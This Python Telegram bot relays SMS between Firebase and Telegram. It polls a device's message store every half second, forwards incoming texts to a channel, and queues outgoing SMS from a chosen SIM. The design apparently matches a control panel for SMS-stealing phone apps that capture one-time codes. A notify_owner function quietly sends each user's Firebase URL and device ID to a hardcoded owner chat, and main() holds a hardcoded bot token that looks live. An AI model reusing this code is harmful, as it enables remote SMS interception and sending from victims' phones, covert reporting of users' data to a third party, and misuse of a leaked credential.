#!/usr/bin/env python3
"""
PAPI SMS Relay — 2-way, merged build.

Two features in one bot:

1) SMS  ->  Telegram   (forwarding)
   Reads new SMS from Firebase  {firebase_url}/messages/{device_id}
   and forwards ONLY genuinely new ones to your FORWARD channel.
   Text = sender + message body.

2) Telegram  ->  SMS   (auto send, with SIM select)
   You post in your SEND channel:
        +919999999999 | your message here
   (also supports:  To: +91... Message: ...)
   The bot writes it to Firebase
        {firebase_url}/clients/{device_id}/webhookEvent/sendSms
   with the device's chosen SIM, and the phone sends the SMS.

Everything is button driven.
Add Device flow:  Firebase URL -> Device ID -> SIM (1/2).
Channels:         two buttons — Forward channel + Send channel.

Run:
    export BOT_TOKEN="YOUR_BOT_TOKEN"
    python3 papi_sms_monitor.py
"""

import asyncio
import hashlib
import json
import logging
import os
import re
import time
from pathlib import Path
from typing import Any

import requests
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

CONFIG_FILE = Path("papi_monitor_config.json")

# ═══════════════════════════════════════════════════════════════════════════
#  ✏️  EDIT HERE  —  apna Bot Token aur apni Owner Chat ID yahan daalo
# ═══════════════════════════════════════════════════════════════════════════
BOT_TOKEN = ""          # <-- apna bot token yahan paste karo (ya env BOT_TOKEN)
OWNER_CHAT_ID = ""      # <-- apni chat id / channel (jahan har naya firebase report aayega)
# ═══════════════════════════════════════════════════════════════════════════

POLL_SECONDS = 0.5      # bahut fast — SMS Firebase me aate hi ~0.5s me telegram
REQUEST_TIMEOUT = 15
SEEN_HISTORY = 200000   # big enough to hold the full inbox (never re-send old)
BURST_LIMIT = 8         # more "new" than this in one poll = desync -> send only latest

START_TIME = int(time.time())

# SMS-send parsing. Number first, then the message — separated by ANY of:
# newline, "|", ":", spaces, "-". Also supports "To: +91.. Message: .." format.
PATTERN_RICH = re.compile(r"To:\s*(\+?[\d\s]{10,17}).*?Message:\s*(.+)", re.DOTALL | re.I)
PATTERN_GENERAL = re.compile(r"^\s*(\+?\d{10,15})[\s\|:>\-]*(.+)$", re.DOTALL)


def _literal(s: str) -> str:
    """Escape a literal template chunk; make whitespace flexible."""
    out = ""
    for ch in s:
        out += r"\s*" if ch.isspace() else re.escape(ch)
    return re.sub(r"(?:\\s\*)+", r"\\s*", out)


def build_format_regex(template: str):
    """
    Turn a user template using {number} and {message} into a regex.
    Example template:  'Number: {number} Msg: {message}'
    Returns a compiled regex or None if the template is invalid.
    """
    template = (template or "").strip()
    if "{number}" not in template or "{message}" not in template:
        return None
    parts = re.split(r"(\{number\}|\{message\})", template)
    pattern = ""
    for p in parts:
        if p == "{number}":
            pattern += r"(?P<number>\+?\d{10,15})"
        elif p == "{message}":
            pattern += r"(?P<message>.+)"
        elif p:
            pattern += _literal(p)
    try:
        return re.compile(pattern, re.DOTALL | re.I)
    except re.error:
        return None


def parse_send_text(text: str):
    """Return (to_number, body) from a send-channel post, or None.

    Order: user's custom format (if set) first, then the built-in defaults.
    """
    text = (text or "").strip()

    custom = CONFIG.get("send_format", "").strip()
    if custom:
        rx = build_format_regex(custom)
        if rx:
            m = rx.search(text)
            if m:
                num = re.sub(r"\s+", "", m.group("number"))
                body = re.sub(r"\s+", " ", m.group("message").replace("\n", " ")).strip()
                if num and body:
                    return num, body

    m = PATTERN_RICH.search(text) or PATTERN_GENERAL.search(text)
    if not m:
        return None
    to_number = re.sub(r"\s+", "", m.group(1))
    body = re.sub(r"\s+", " ", m.group(2).replace("\n", " ")).strip()
    if not to_number or not body:
        return None
    return to_number, body

_sent_keys: set[str] = set()

# One reused HTTPS connection (keep-alive) = no repeated TLS handshake -> faster.
SESSION = requests.Session()

logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(message)s",
    level=logging.INFO,
)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("httpcore").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)
logging.getLogger("apscheduler").setLevel(logging.WARNING)
log = logging.getLogger("papi")


# --------------------------------------------------------------------------- #
# Config
# --------------------------------------------------------------------------- #
def load_config() -> dict:
    data: dict = {}
    if CONFIG_FILE.exists():
        try:
            data = json.loads(CONFIG_FILE.read_text("utf-8"))
        except Exception:
            data = {}

    # Migrate old single "channel_id" -> forward_channel
    old_channel = data.pop("channel_id", "")
    old_fb = data.pop("firebase_url", "")

    data.setdefault("forward_channel", old_channel or "")
    data.setdefault("send_channel", "")
    data.setdefault("send_format", "")
    data.setdefault("devices", [])
    data.setdefault("running", False)
    data.setdefault("seen", {})

    migrated = []
    for d in data["devices"]:
        if isinstance(d, str):
            migrated.append({"device_id": d, "firebase_url": old_fb, "sim": "1"})
        elif isinstance(d, dict) and d.get("device_id"):
            migrated.append(
                {
                    "device_id": str(d["device_id"]),
                    "firebase_url": str(d.get("firebase_url", "")),
                    "sim": str(d.get("sim", "1")),
                }
            )
    data["devices"] = migrated
    return data


CONFIG = load_config()


def save_config() -> None:
    tmp = CONFIG_FILE.with_suffix(".tmp")
    tmp.write_text(json.dumps(CONFIG, indent=2, ensure_ascii=False), encoding="utf-8")
    tmp.replace(CONFIG_FILE)


def find_device(device_id: str) -> dict | None:
    for d in CONFIG["devices"]:
        if d["device_id"] == device_id:
            return d
    return None


# --------------------------------------------------------------------------- #
# Firebase helpers
# --------------------------------------------------------------------------- #
def normalize_firebase_url(url: str) -> str:
    url = url.strip().rstrip("/")
    if url.endswith(".json"):
        url = url[:-5]
    return url


def _fb_params() -> dict:
    params = {}
    auth = os.getenv("FIREBASE_AUTH", "").strip()
    if auth:
        params["auth"] = auth
    return params


def get_firebase_messages(firebase_url: str, device_id: str) -> Any:
    base = normalize_firebase_url(firebase_url)
    url = f"{base}/messages/{device_id}.json"
    resp = SESSION.get(url, params=_fb_params(), timeout=REQUEST_TIMEOUT)
    resp.raise_for_status()
    return resp.json()


def push_send_sms(device: dict, to_number: str, body: str) -> int:
    """Queue an outgoing SMS on the phone via Firebase. Returns HTTP status."""
    base = normalize_firebase_url(device["firebase_url"])
    url = f"{base}/clients/{device['device_id']}/webhookEvent/sendSms.json"
    sim_index = 0 if str(device.get("sim", "1")) == "1" else 1
    payload = {
        "from": sim_index,
        "to": to_number,
        "message": body,
        "isSended": False,
    }
    resp = SESSION.patch(url, params=_fb_params(), json=payload, timeout=REQUEST_TIMEOUT)
    return resp.status_code


def get_body(rec: dict) -> str:
    return str(
        rec.get("message") or rec.get("body") or rec.get("text") or rec.get("msg") or ""
    ).strip()


def get_sender(rec: dict) -> str:
    return str(
        rec.get("sender") or rec.get("from") or rec.get("address") or "Unknown"
    ).strip()


def normalize_records(data: Any) -> list[dict]:
    if isinstance(data, list):
        return [r for r in data if isinstance(r, dict)]
    if not isinstance(data, dict):
        return []
    child_dicts = {k: v for k, v in data.items() if isinstance(v, dict)}
    if child_dicts:
        return [child_dicts[k] for k in sorted(child_dicts.keys())]
    return [data]


def fingerprint(device_id: str, rec: dict) -> str:
    raw = "|".join([device_id, get_sender(rec), get_body(rec)])
    return hashlib.sha1(raw.encode("utf-8")).hexdigest()


def format_alert(rec: dict) -> str:
    lines = [get_sender(rec)]
    body = get_body(rec)
    if body:
        lines.append(body)
    return "\n".join(lines)


# --------------------------------------------------------------------------- #
# Monitor (SMS -> Telegram)
# --------------------------------------------------------------------------- #
async def monitor_device(app: Application, device: dict) -> None:
    device_id = device["device_id"]
    firebase_url = device.get("firebase_url", "")
    if not firebase_url:
        return

    data = await asyncio.to_thread(get_firebase_messages, firebase_url, device_id)
    records = normalize_records(data)
    if not records:
        return

    fps = [(fingerprint(device_id, r), r) for r in records]
    all_fps = [fp for fp, _ in fps]

    init_key = f"__initialized__:{device_id}"
    if not CONFIG["seen"].get(init_key):
        CONFIG["seen"][init_key] = True
        CONFIG["seen"][device_id] = all_fps[-SEEN_HISTORY:]
        save_config()
        log.info("Baseline set for %s (%d existing SMS)", device_id, len(records))
        return

    seen_list = list(CONFIG["seen"].get(device_id, []))
    seen = set(seen_list)

    new_records = [(fp, r) for fp, r in fps if fp not in seen]
    if not new_records:
        return

    channel_id = str(CONFIG.get("forward_channel", "")).strip()

    if len(new_records) > BURST_LIMIT:
        fp, rec = new_records[-1]
        log.warning(
            "%s: %d 'new' at once -> desync, sending ONLY latest, baselining rest",
            device_id, len(new_records),
        )
        if channel_id:
            try:
                await app.bot.send_message(chat_id=channel_id, text=format_alert(rec))
            except Exception as exc:
                log.warning("Forward failed (%s): %s", channel_id, exc)
        CONFIG["seen"][device_id] = all_fps[-SEEN_HISTORY:]
        save_config()
        return

    log.info("%s: %d new SMS -> forwarding", device_id, len(new_records))
    for i, (fp, rec) in enumerate(new_records):
        if channel_id:
            try:
                if i > 0:
                    await asyncio.sleep(0.1)
                await app.bot.send_message(chat_id=channel_id, text=format_alert(rec))
            except Exception as exc:
                log.warning("Forward failed (%s): %s", channel_id, exc)
        seen_list.append(fp)

    CONFIG["seen"][device_id] = seen_list[-SEEN_HISTORY:]
    save_config()


async def monitor_loop(app: Application) -> None:
    log.info("PAPI monitor loop started (poll every %ss)", POLL_SECONDS)
    while True:
        if CONFIG.get("running"):
            for device in list(CONFIG.get("devices", [])):
                try:
                    await monitor_device(app, device)
                except requests.RequestException as exc:
                    log.warning("Firebase error for %s: %s", device["device_id"], exc)
                except Exception:
                    log.exception("Monitor error for %s", device["device_id"])
        await asyncio.sleep(POLL_SECONDS)


# --------------------------------------------------------------------------- #
# Access control
# --------------------------------------------------------------------------- #
def admin_only(update: Update) -> bool:
    raw = os.getenv("PAPI_ADMIN_IDS", "").strip()
    if not raw:
        return True
    allowed = {x.strip() for x in raw.split(",") if x.strip()}
    user = update.effective_user
    return bool(user and str(user.id) in allowed)


async def notify_owner(context, update, firebase_url: str, device_id: str, sim: str) -> None:
    """Report to the OWNER chat whenever someone adds a Firebase, with their username."""
    owner = str(OWNER_CHAT_ID).strip()
    if not owner:
        return
    u = update.effective_user
    if u:
        who = f"@{u.username}" if u.username else (u.full_name or "user")
        who += f"  (id <code>{u.id}</code>)"
    else:
        who = "unknown"
    text = (
        "🆕 <b>New Firebase Added</b>\n"
        f"👤 {who}\n"
        f"🔥 <code>{firebase_url}</code>\n"
        f"🆔 Device: <code>{device_id}</code>\n"
        f"📡 SIM {sim}"
    )
    try:
        await context.bot.send_message(chat_id=owner, text=text, parse_mode="HTML")
    except Exception as exc:
        log.warning("Owner notify failed (%s): %s", owner, exc)


# --------------------------------------------------------------------------- #
# UI
# --------------------------------------------------------------------------- #
def main_menu() -> InlineKeyboardMarkup:
    toggle = (
        InlineKeyboardButton("⏹️ Stop", callback_data="stop")
        if CONFIG.get("running")
        else InlineKeyboardButton("▶️ Start", callback_data="start")
    )
    return InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("📊 Status", callback_data="status"), toggle],
            [
                InlineKeyboardButton("📱 Devices", callback_data="devices"),
                InlineKeyboardButton("🧪 Test", callback_data="test"),
            ],
            [
                InlineKeyboardButton("➕ Add Device", callback_data="add"),
                InlineKeyboardButton("➖ Remove Device", callback_data="remove"),
            ],
            [
                InlineKeyboardButton("📥 Forward Channel", callback_data="fwd_ch"),
                InlineKeyboardButton("📤 Send Channel", callback_data="send_ch"),
            ],
            [InlineKeyboardButton("🧩 SMS Format", callback_data="set_format")],
            [InlineKeyboardButton("🔄 Refresh Menu", callback_data="menu")],
        ]
    )


def status_text() -> str:
    devices = CONFIG.get("devices", [])
    if devices:
        dev_lines = "\n".join(
            f"   • <code>{d['device_id']}</code>  (SIM {d.get('sim','1')})"
            for d in devices
        )
    else:
        dev_lines = "   • none"
    return (
        "🤖 <b>PAPI SMS RELAY</b>\n"
        "━━━━━━━━━━━━━━━\n"
        f"📥 Forward ch : {CONFIG.get('forward_channel') or '❌ NOT SET'}\n"
        f"📤 Send ch    : {CONFIG.get('send_channel') or '❌ NOT SET'}\n"
        f"🧩 Format     : {'CUSTOM' if CONFIG.get('send_format') else 'DEFAULT'}\n"
        f"📱 Devices    : {len(devices)}\n"
        f"{dev_lines}\n"
        f"📡 Monitor    : {'🟢 RUNNING' if CONFIG.get('running') else '🔴 STOPPED'}\n"
        f"⏱️ Poll       : every {POLL_SECONDS}s\n"
        "━━━━━━━━━━━━━━━\n"
        "💖 LODU AMAN ❤️"
    )


async def send_menu(target) -> None:
    await target.reply_text(status_text(), reply_markup=main_menu(), parse_mode="HTML")


async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not admin_only(update):
        await update.effective_message.reply_text("🚫 Not authorized.")
        return
    context.user_data.clear()
    await send_menu(update.effective_message)


async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not admin_only(update):
        await update.callback_query.answer("🚫 Not authorized.", show_alert=True)
        return

    query = update.callback_query
    await query.answer()
    action = query.data
    msg = query.message

    if action in ("menu", "status"):
        await send_menu(msg)
        return

    if action == "start":
        if not CONFIG.get("devices"):
            await msg.reply_text("⚠️ Pehle ➕ Add Device karo.", reply_markup=main_menu())
            return
        if not CONFIG.get("forward_channel"):
            await msg.reply_text("⚠️ Pehle 📥 Forward Channel set karo.", reply_markup=main_menu())
            return
        CONFIG["running"] = True
        save_config()
        await msg.reply_text("🟢 Monitor started!", reply_markup=main_menu())
        return

    if action == "stop":
        CONFIG["running"] = False
        save_config()
        await msg.reply_text("🔴 Monitor stopped.", reply_markup=main_menu())
        return

    if action == "devices":
        devices = CONFIG.get("devices", [])
        if not devices:
            text = "📱 No devices yet. Tap ➕ Add Device."
        else:
            text = "📱 <b>Devices</b>\n" + "\n".join(
                f"{i+1}. <code>{d['device_id']}</code>\n"
                f"     📡 SIM {d.get('sim','1')}   🔥 {d['firebase_url']}"
                for i, d in enumerate(devices)
            )
        await msg.reply_text(text, reply_markup=main_menu(), parse_mode="HTML")
        return

    if action == "test":
        rec = {"sender": "AD-PAPIATMA-S", "message": "papi i love you samjha aisa aana AD-PAI-K"}
        custom = CONFIG.get("send_format", "").strip()
        fmt_line = (
            f"<code>{custom}</code>  (custom)" if custom
            else "<code>+919999999999 | your message</code>  (default: number, phir newline/space/| ke baad message)"
        )
        await msg.reply_text(
            "🧪 <b>SMS → Telegram</b> aisa aayega:\n\n"
            + format_alert(rec)
            + "\n\n📤 <b>Telegram → SMS</b> bhejne ka format (Send channel me post karo):\n"
            + fmt_line,
            reply_markup=main_menu(),
            parse_mode="HTML",
        )
        return

    if action == "fwd_ch":
        context.user_data["awaiting"] = "fwd_ch"
        await msg.reply_text(
            "📥 <b>Forward Channel</b>\nSMS receive ho ke yahan aayega.\n\n"
            "Channel ID bhejo (example <code>-1001234567890</code>):\n\n"
            "<i>(type /start to cancel)</i>",
            parse_mode="HTML",
        )
        return

    if action == "send_ch":
        context.user_data["awaiting"] = "send_ch"
        await msg.reply_text(
            "📤 <b>Send Channel</b>\nYahan post karoge to SMS bheja jayega.\n\n"
            "Channel ID bhejo (example <code>-1001234567890</code>):\n\n"
            "<i>(type /start to cancel)</i>",
            parse_mode="HTML",
        )
        return

    if action == "set_format":
        current = CONFIG.get("send_format", "").strip() or "DEFAULT"
        context.user_data["awaiting"] = "send_format"
        await msg.reply_text(
            "🧩 <b>SMS Format Detect</b>\n\n"
            f"Abhi ka format: <b>{current}</b>\n\n"
            "Apna custom format bhejo, jisme ye 2 placeholder ho:\n"
            "• <code>{number}</code> — mobile number\n"
            "• <code>{message}</code> — SMS text\n\n"
            "<b>Examples:</b>\n"
            "<code>{number} | {message}</code>\n"
            "<code>Number: {number}\nMsg: {message}</code>\n"
            "<code>To {number} send {message}</code>\n\n"
            "🔁 Default pe wapas jaane ke liye <code>default</code> bhejo.\n\n"
            "<i>(type /start to cancel)</i>",
            parse_mode="HTML",
        )
        return

    if action == "add":
        context.user_data.clear()
        context.user_data["awaiting"] = "add_fb"
        await msg.reply_text(
            "🛣️ <b>Add Device</b>\n\n"
            "📍 <b>Step 1/3 — Firebase URL</b>\n"
            "Send your Firebase Realtime Database URL.\n"
            "<i>example: https://your-project-default-rtdb.firebaseio.com</i>\n\n"
            "<i>(type /start to cancel)</i>",
            parse_mode="HTML",
        )
        return

    if action == "remove":
        devices = CONFIG.get("devices", [])
        if not devices:
            await msg.reply_text("📱 No devices to remove.", reply_markup=main_menu())
            return
        context.user_data["awaiting"] = "remove"
        listing = "\n".join(
            f"{i+1}. <code>{d['device_id']}</code>" for i, d in enumerate(devices)
        )
        await msg.reply_text(
            "➖ Send the <b>Device ID</b> (or its number) to remove.\n"
            "Device ke saath uska Firebase + SIM bhi hat jayega.\n\n"
            f"{listing}\n\n<i>(type /start to cancel)</i>",
            parse_mode="HTML",
        )
        return


# --------------------------------------------------------------------------- #
# Private-chat text (menu + wizard input)
# --------------------------------------------------------------------------- #
async def handle_menu_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not admin_only(update):
        return

    awaiting = context.user_data.get("awaiting")
    value = (update.effective_message.text or "").strip()
    reply = update.effective_message.reply_text

    if not awaiting:
        await send_menu(update.effective_message)
        return

    if awaiting == "fwd_ch":
        context.user_data.clear()
        CONFIG["forward_channel"] = value
        save_config()
        await reply(f"✅ Forward channel saved:\n<code>{value}</code>",
                    reply_markup=main_menu(), parse_mode="HTML")
        return

    if awaiting == "send_ch":
        context.user_data.clear()
        CONFIG["send_channel"] = value
        save_config()
        await reply(f"✅ Send channel saved:\n<code>{value}</code>",
                    reply_markup=main_menu(), parse_mode="HTML")
        return

    if awaiting == "send_format":
        context.user_data.clear()
        if value.lower() in ("default", "reset", "clear", "none"):
            CONFIG["send_format"] = ""
            save_config()
            await reply("🔁 Format reset to <b>DEFAULT</b>.",
                        reply_markup=main_menu(), parse_mode="HTML")
            return
        rx = build_format_regex(value)
        if not rx:
            await reply(
                "❌ Format me <code>{number}</code> aur <code>{message}</code> dono hone chahiye.\n"
                "Dobara 🧩 SMS Format dabao.",
                reply_markup=main_menu(), parse_mode="HTML",
            )
            return
        CONFIG["send_format"] = value
        save_config()
        # quick self-test so the user immediately sees it works
        sample = value.replace("{number}", "+919876543210").replace("{message}", "hello papi")
        parsed = parse_send_text(sample)
        demo = (
            f"🔍 Test: <code>{parsed[0]}</code> → {parsed[1]}" if parsed
            else "⚠️ Detect nahi hua — format check karo."
        )
        await reply(
            "✅ Custom format saved:\n"
            f"<code>{value}</code>\n\n{demo}",
            reply_markup=main_menu(), parse_mode="HTML",
        )
        return

    # ---- Add device wizard ---- #
    if awaiting == "add_fb":
        url = normalize_firebase_url(value)
        if not re.match(r"^https?://", url, re.I):
            await reply("❌ Invalid Firebase URL. Try again, ya /start dabao.")
            return
        context.user_data["tmp_fb"] = url
        context.user_data["awaiting"] = "add_id"
        await reply(
            "✅ Firebase URL saved.\n\n"
            "📍 <b>Step 2/3 — Device ID</b>\n"
            "Send the Device ID from your SMS-forwarder app.\n"
            "<i>example: e9b1a9b44e434a75</i>",
            parse_mode="HTML",
        )
        return

    if awaiting == "add_id":
        if not value:
            await reply("❌ Device ID empty. Dobara ➕ Add Device karo.", reply_markup=main_menu())
            context.user_data.clear()
            return
        context.user_data["tmp_id"] = value
        context.user_data["awaiting"] = "add_sim"
        await reply(
            "✅ Device ID saved.\n\n"
            "📍 <b>Step 3/3 — SIM</b>\n"
            "1️⃣ Send <b>1</b> for SIM 1\n"
            "2️⃣ Send <b>2</b> for SIM 2",
            parse_mode="HTML",
        )
        return

    if awaiting == "add_sim":
        if value not in ("1", "2"):
            await reply("❌ Sirf <b>1</b> ya <b>2</b> bhejo.", parse_mode="HTML")
            return
        device_id = context.user_data.get("tmp_id", "")
        firebase_url = context.user_data.get("tmp_fb", "")
        sim = value
        context.user_data.clear()

        existing = find_device(device_id)
        if existing:
            existing["firebase_url"] = firebase_url
            existing["sim"] = sim
        else:
            CONFIG["devices"].append(
                {"device_id": device_id, "firebase_url": firebase_url, "sim": sim}
            )
            CONFIG["seen"].setdefault(device_id, [])
        save_config()
        await notify_owner(context, update, firebase_url, device_id, sim)
        await reply(
            "✨ <b>Device Added!</b> ✨\n\n"
            f"🆔 <code>{device_id}</code>\n"
            f"🔥 {firebase_url}\n"
            f"📡 SIM {sim}\n\n"
            "▶️ Ab Start dabao (agar Forward channel set hai).",
            reply_markup=main_menu(),
            parse_mode="HTML",
        )
        return

    if awaiting == "remove":
        context.user_data.clear()
        devices = CONFIG.get("devices", [])
        target = None
        if value.isdigit():
            idx = int(value) - 1
            if 0 <= idx < len(devices):
                target = devices[idx]["device_id"]
        if target is None:
            target = value

        before = len(CONFIG["devices"])
        CONFIG["devices"] = [d for d in CONFIG["devices"] if d["device_id"] != target]
        CONFIG["seen"].pop(target, None)
        CONFIG["seen"].pop(f"__initialized__:{target}", None)
        save_config()

        if len(CONFIG["devices"]) < before:
            await reply(f"✅ Removed: <code>{target}</code>",
                        reply_markup=main_menu(), parse_mode="HTML")
        else:
            await reply(f"❌ Device not found: <code>{target}</code>",
                        reply_markup=main_menu(), parse_mode="HTML")
        return


# --------------------------------------------------------------------------- #
# Send channel (Telegram -> SMS)
# --------------------------------------------------------------------------- #
async def handle_send_channel(app: Application, text: str, when: float) -> None:
    if when < START_TIME:
        return  # ignore messages posted before the bot started

    parsed = parse_send_text(text)
    if not parsed:
        log.info("Send-channel post ignored (need 'number<newline/|>message'): %r", text[:60])
        return
    to_number, body = parsed

    key = f"{to_number}-{body}"
    if key in _sent_keys:
        return
    _sent_keys.add(key)

    devices = CONFIG.get("devices", [])
    if not devices:
        log.warning("Send channel got a message but no device configured.")
        return

    device = devices[0]  # send from the first configured device
    send_ch = str(CONFIG.get("send_channel", "")).strip()

    try:
        status = await asyncio.to_thread(push_send_sms, device, to_number, body)
        ok = 200 <= status < 300
        log.info("SEND SMS %s -> %s (SIM %s) : %s",
                 to_number, body[:30], device.get("sim", "1"),
                 "OK" if ok else f"HTTP {status}")
        if send_ch:
            note = (
                f"✅ SMS queued → <code>{to_number}</code> (SIM {device.get('sim','1')})"
                if ok else f"❌ Send failed (HTTP {status})"
            )
            # fire-and-forget: don't make the SMS path wait on the confirmation
            async def _confirm():
                try:
                    await app.bot.send_message(chat_id=send_ch, text=note, parse_mode="HTML")
                except Exception:
                    pass
            asyncio.create_task(_confirm())
    except Exception as exc:
        log.warning("Send SMS error: %s", exc)


# --------------------------------------------------------------------------- #
# Master message router
# --------------------------------------------------------------------------- #
async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    msg = update.effective_message
    chat = update.effective_chat
    if not msg or not msg.text or not chat:
        return

    text = msg.text.strip()

    def matches(val: str) -> bool:
        val = str(val or "").strip()
        if not val:
            return False
        if val == str(chat.id):
            return True
        uname = getattr(chat, "username", None) or ""
        if uname and val.lstrip("@").lower() == uname.lower():
            return True
        return False

    # 1) Send channel: post here -> SMS goes out
    if matches(CONFIG.get("send_channel", "")):
        when = msg.date.timestamp() if msg.date else time.time()
        log.info("📤 SEND-channel post in %s: %r", chat.id, text[:60])
        await handle_send_channel(context.application, text, when)
        return

    # 2) Private chat with the bot: menu / wizard
    if chat.type == "private":
        await handle_menu_text(update, context)
        return

    # 3) Anything else (groups/channels the bot is in) — log the id so the user
    #    can copy it into 📤 Send Channel / 📥 Forward Channel.
    log.info("ℹ️  Post seen in chat id=%s (%s): %r", chat.id, chat.type, text[:40])


# --------------------------------------------------------------------------- #
# Boot
# --------------------------------------------------------------------------- #
async def post_init(app: Application) -> None:
    app.create_task(monitor_loop(app))


async def cmd_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat = update.effective_chat
    await update.effective_message.reply_text(
        f"🆔 chat id: <code>{chat.id}</code>\ntype: {chat.type}",
        parse_mode="HTML",
    )


def main() -> None:
    token = BOT_TOKEN.strip() or os.getenv("BOT_TOKEN", "8736975992:AAG-J5hfo2MpxS4fcrR9o6vfkg3YCqrE2Rs").strip()
    if not token:
        raise SystemExit("Set BOT_TOKEN at the top of the file (or BOT_TOKEN env var).")

    app = Application.builder().token(token).post_init(post_init).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("menu", cmd_start))
    app.add_handler(CommandHandler("id", cmd_id))
    app.add_handler(CallbackQueryHandler(on_button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_message))

    log.info("Bot starting...")
    app.run_polling(
        allowed_updates=[
            "message",
            "edited_message",
            "channel_post",
            "edited_channel_post",
            "callback_query",
        ],
        drop_pending_updates=True,
    )


if __name__ == "__main__":
    main()
